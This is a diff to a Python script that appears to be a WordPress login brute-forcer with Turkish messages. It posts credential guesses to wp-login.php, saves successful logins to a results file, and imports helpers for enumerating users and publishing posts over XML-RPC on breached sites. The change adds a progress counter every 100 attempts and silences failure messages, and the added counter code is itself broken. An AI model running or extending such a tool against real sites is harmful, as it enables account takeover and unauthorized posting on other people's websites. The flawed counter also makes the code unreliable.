@@ -4,7 +4,8 @@ from tools import colorprint
 from tools import getwpusers
 from wordpress_xmlrpc import Client, WordPressPost
 from wordpress_xmlrpc.methods.posts import NewPost
-
+hebele = 0
+hebele2 = 0
 def save(content):
     try:
         with open("results.txt", 'a') as f:  # dosya_adi adlı dosyayı aç ve yazma modunda aç
@@ -41,6 +42,11 @@ def index_method1(url,username,password,content):
     pass
 
 def brute(url, username, password):
+    hebele +=1
+    hebele2 +=1
+    if(hebele ==100):
+        colorprint.resultprint(f"{hebele2} tane tarandı!")
+        hebele = 0
     login_url = f'{url}/wp-login.php'
     session = requests.session()
 
@@ -62,7 +68,7 @@ def brute(url, username, password):
         save(f'{url}/wp-login.php {username}:{password} Giriş Başarılı!')
         return True
     else:
-        colorprint.resultprint(f'{url}/wp-login.php {username}:{password} Giriş Başarısız!', "f")
+        #colorprint.resultprint(f'{url}/wp-login.php {username}:{password} Giriş Başarısız!', "f")
         return False
 
 def url2domain(url):
